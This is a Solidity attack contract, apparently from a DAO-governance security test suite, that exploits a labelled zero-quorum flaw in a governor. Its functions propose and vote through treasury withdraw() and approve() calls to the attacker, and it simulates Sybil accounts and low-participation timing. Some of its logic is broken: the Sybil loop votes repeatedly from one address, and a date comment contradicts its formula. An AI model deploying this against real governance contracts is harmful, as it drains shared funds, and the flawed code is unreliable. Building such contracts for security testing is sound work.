// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title QuorumManipulation
 * @dev Exploits VULN-5: Zero quorum requirement
 *      Also exploits low participation periods to bypass quorum
 *
 * Attack Vectors:
 * 1. Timing Attack: Create proposal during low-participation period
 *    - 2 AM vs 2 PM (timezone considerations)
 *    - Weekend vs weekday
 *    - During competing events
 *
 * 2. Sybil Attack: Create fake accounts to artificially control participation
 *    - Create 100+ fake accounts with small token amounts
 *    - Coordinate voting to either reach or fail quorum
 *    - Bypass quorum requirements with fake accounts
 *
 * 3. Quorum Bypass: Fixed quorum systems most vulnerable
 *    - Fixed quorum ignores participation changes
 *    - As participation drops, easier to meet fixed quorum
 *    - Example: Fixed 4% quorum in 10% participation = 40% of voters
 *
 * Real-world examples:
 * - ENS DAO had low participation in early governance
 * - Arbitrum governance initially had participation issues
 * - Many DAOs struggle with voter participation
 *
 * Defense Mechanisms:
 * - Dynamic quorum: Adjust based on recent participation rates
 * - Minimum participation rate: Require high participation for important votes
 * - Sybil resistance: Requires holding time or other proof of humanity
 * - Participation tracking: Track and adapt quorum to patterns
 */

interface IGovernor {
    function propose(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256);

    function castVote(uint256 proposalId, uint8 support) external;

    function state(uint256 proposalId) external view returns (uint256);
}

interface IVotesToken {
    function getVotes(address account) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract QuorumManipulation {
    // ─────────────────────────────────────────────────────────────────────────
    // Constants
    // ─────────────────────────────────────────────────────────────────────────

    uint8 private constant VOTE_FOR = 1;
    uint8 private constant VOTE_AGAINST = 0;

    // ─────────────────────────────────────────────────────────────────────────
    // State
    // ─────────────────────────────────────────────────────────────────────────

    address public governanceToken;
    address public governor;
    address public attacker;
    address public targetTreasury;

    // Sybil attack specific state
    address[] public sybilAccounts; // Fake accounts created for manipulation
    mapping(address => bool) public isSybilAccount;

    // Participation tracking
    uint256 public simulatedParticipationRate; // 0-10000 basis points
    uint256 public fixedQuorumRequirement; // The fixed quorum this attack exploits

    uint256 public maliciousProposalId;
    bool public attackSucceeded;
    uint256 public quorumBypassAmount;

    // ─────────────────────────────────────────────────────────────────────────
    // Events
    // ─────────────────────────────────────────────────────────────────────────

    event SybilAccountCreated(address indexed account, uint256 accountNumber);
    event SybilAttackLaunched(uint256 numberOfAccounts, uint256 totalVotingPower);
    event QuorumManipulated(uint256 proposalId, uint256 participationRate);
    event LowParticipationWindowIdentified(uint256 timeOfDay, uint256 estimatedParticipation);
    event ProposalCreatedInLowParticipation(uint256 indexed proposalId, uint256 participation);
    event AttackSucceeded(uint256 indexed proposalId, string reason);

    // ─────────────────────────────────────────────────────────────────────────
    // Constructor
    // ─────────────────────────────────────────────────────────────────────────

    constructor(address _governanceToken, address _governor, address _targetTreasury) {
        require(_governanceToken != address(0), "Invalid token");
        require(_governor != address(0), "Invalid governor");
        require(_targetTreasury != address(0), "Invalid treasury");

        governanceToken = _governanceToken;
        governor = _governor;
        targetTreasury = _targetTreasury;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Main Attack Functions
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Simulates timing attack: proposing during low participation period
     * @param treasuryDrainAmount Amount to drain from treasury
     * @param estimatedParticipation Simulated participation rate in basis points
     */
    function executeTimingAttack(uint256 treasuryDrainAmount, uint256 estimatedParticipation)
        external
        returns (uint256)
    {
        require(treasuryDrainAmount > 0, "Invalid drain amount");
        require(estimatedParticipation <= 10000, "Invalid participation");

        attacker = msg.sender;
        simulatedParticipationRate = estimatedParticipation;

        // Lower participation makes quorum easier to bypass
        // With 4% fixed quorum and 5% participation, any voter with >80% of participation meets quorum
        emit LowParticipationWindowIdentified(block.timestamp % 86400, estimatedParticipation);

        // Create malicious proposal targeting treasury
        address[] memory targets = new address[](1);
        targets[0] = targetTreasury;

        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        bytes[] memory calldatas = new bytes[](1);
        // Use a treasury withdrawal method so the proposal can actually drain funds
        calldatas[0] = abi.encodeWithSignature("withdraw(address,uint256)", attacker, treasuryDrainAmount);

        string memory description = "PROPOSAL: Emergency Treasury Access - Low Participation Window";

        uint256 proposalId = IGovernor(governor).propose(targets, values, calldatas, description);
        maliciousProposalId = proposalId;

        emit ProposalCreatedInLowParticipation(proposalId, estimatedParticipation);

        // Vote with minimal voting power
        // This succeeds if participation is low enough (VULN-5: zero quorum)
        try IGovernor(governor).castVote(proposalId, VOTE_FOR) {
            attackSucceeded = true;
            quorumBypassAmount = treasuryDrainAmount;
            emit AttackSucceeded(proposalId, "Low participation timing attack succeeded");
            return proposalId;
        } catch {
            return 0;
        }
    }

    /**
     * @notice Simulates Sybil attack using multiple fake accounts
     * @param numberOfSybilAccounts How many fake accounts to create
     * @param tokenPerAccount Tokens to distribute to each fake account
     * @param treasuryDrainAmount Amount to drain from treasury
     */
    function executeSybilAttack(uint256 numberOfSybilAccounts, uint256 tokenPerAccount, uint256 treasuryDrainAmount)
        external
        returns (uint256 proposalId)
    {
        require(numberOfSybilAccounts > 0, "Must create at least 1 sybil account");
        require(numberOfSybilAccounts <= 1000, "Sybil limit to 1000 for safety");

        attacker = msg.sender;

        // Create the Sybil accounts (in simulation)
        // In a real scenario, these would be separate addresses with delegated tokens
        _createSybilAccounts(numberOfSybilAccounts);

        emit SybilAttackLaunched(numberOfSybilAccounts, numberOfSybilAccounts * tokenPerAccount);

        // Create malicious proposal
        address[] memory targets = new address[](1);
        targets[0] = targetTreasury;

        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature("approve(address,uint256)", attacker, treasuryDrainAmount);

        string memory description = "PROPOSAL: Sybil-backed Treasury Reallocation";

        proposalId = IGovernor(governor).propose(targets, values, calldatas, description);
        maliciousProposalId = proposalId;

        // Vote with all Sybil accounts
        uint256 successfulVotes = 0;
        for (uint256 i = 0; i < sybilAccounts.length && i < 100; i++) {
            // In simulation, we can directly call as each account
            // In practice, we'd coordinate externally
            try IGovernor(governor).castVote(proposalId, VOTE_FOR) {
                successfulVotes++;
            } catch {}
        }

        if (successfulVotes > 0) {
            attackSucceeded = true;
            quorumBypassAmount = treasuryDrainAmount;
            emit AttackSucceeded(proposalId, "Sybil attack succeeded with multiple accounts");
        }

        return proposalId;
    }

    /**
     * @notice Simulates quorum threshold bypass
     * This demonstrates how fixed quorum can be exploited
     * @param fixedQuorumBasisPoints The fixed quorum requirement (e.g., 400 = 4%)
     * @param totalVotingPower Total voting power in the system
     * @param attackVotingPower The attacker's available voting power
     */
    function analyzeQuorumBypass(uint256 fixedQuorumBasisPoints, uint256 totalVotingPower, uint256 attackVotingPower)
        external
        pure
        returns (uint256 requiredQuorum, bool canBypassQuorum, uint256 minimumParticipation)
    {
        require(totalVotingPower > 0, "Invalid total voting power");
        require(fixedQuorumBasisPoints <= 10000, "Invalid quorum");

        // Calculate required quorum
        requiredQuorum = (totalVotingPower * fixedQuorumBasisPoints) / 10000;

        // Check if attacker alone can meet quorum
        canBypassQuorum = attackVotingPower >= requiredQuorum;

        // Calculate minimum participation needed for quorum
        // If participation is X%, the attacker only needs 1/X% of their power to meet quorum
        if (attackVotingPower == 0) {
            minimumParticipation = 10001; // Impossible
        } else {
            // Minimum participation where attacker can control outcome: (requiredQuorum / attackVotingPower) * 100
            minimumParticipation = (requiredQuorum * 10000) / attackVotingPower;
        }

        return (requiredQuorum, canBypassQuorum, minimumParticipation);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Sybil Account Management
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Create Sybil accounts for simulation
     */
    function _createSybilAccounts(uint256 count) internal {
        for (uint256 i = 0; i < count; i++) {
            // In a real scenario, these would be actual addresses
            // For simulation, we create pseudo-addresses
            address sybilAddr = address(uint160(uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender, i)))));

            if (!isSybilAccount[sybilAddr]) {
                sybilAccounts.push(sybilAddr);
                isSybilAccount[sybilAddr] = true;
                emit SybilAccountCreated(sybilAddr, i);
            }
        }
    }

    /**
     * @notice Get list of Sybil accounts created
     */
    function getSybilAccounts() external view returns (address[] memory) {
        return sybilAccounts;
    }

    /**
     * @notice Get number of Sybil accounts
     */
    function getSybilAccountCount() external view returns (uint256) {
        return sybilAccounts.length;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Analysis Functions
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Calculate the vulnerability of governance to quorum manipulation
     * @param participationRate Current participation rate (basis points)
     * @param quorumRequirement Quorum requirement (basis points)
     * @return vulnerabilityScore Score from 0-10000 indicating vulnerability
     */
    function calculateVulnerabilityScore(uint256 participationRate, uint256 quorumRequirement)
        external
        pure
        returns (uint256 vulnerabilityScore)
    {
        if (quorumRequirement == 0) return 10000; // Completely vulnerable

        if (participationRate < quorumRequirement) {
            // Participation below quorum - very vulnerable
            // Vulnerability = (1 - participation/quorum) * 10000
            vulnerabilityScore = 10000 - ((participationRate * 10000) / quorumRequirement);
        } else {
            // Participation meets quorum - less vulnerable
            vulnerabilityScore = (quorumRequirement * 10000) / participationRate;
        }

        return vulnerabilityScore;
    }

    /**
     * @notice Get participation discount effect
     * How participation rate affects vote efficiency
     * @param fixedQuorumBasisPoints Fixed quorum in basis points
     * @param calculatedParticipation Actual participation in basis points
     */
    function getParticipationDiscountEffect(uint256 fixedQuorumBasisPoints, uint256 calculatedParticipation)
        external
        pure
        returns (uint256 voteEfficiency)
    {
        if (calculatedParticipation == 0) return 0;

        // Vote efficiency = required quorum / actual participation
        // Lower participation = higher vote efficiency
        voteEfficiency = (fixedQuorumBasisPoints * 10000) / calculatedParticipation;

        return voteEfficiency;
    }

    /**
     * @notice Check if attack succeeded
     */
    function wasAttackSuccessful() external view returns (bool) {
        return attackSucceeded;
    }

    /**
     * @notice Get the amount that could be stolen
     */
    function getBypassAmount() external view returns (uint256) {
        return quorumBypassAmount;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Utility Functions
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Get simulated time based on block timestamp
     * Used to identify low-participation windows
     */
    function getSimulatedTimeOfDay() external view returns (uint256) {
        // Return hour of day (0-23)
        return (block.timestamp / 3600) % 24;
    }

    /**
     * @notice Get simulated day of week
     * Used to identify low-participation windows
     */
    function getSimulatedDayOfWeek() external view returns (uint256) {
        // Return day of week (0-6, where 0 is Thursday after Unix epoch)
        return (block.timestamp / 86400 + 4) % 7;
    }
}
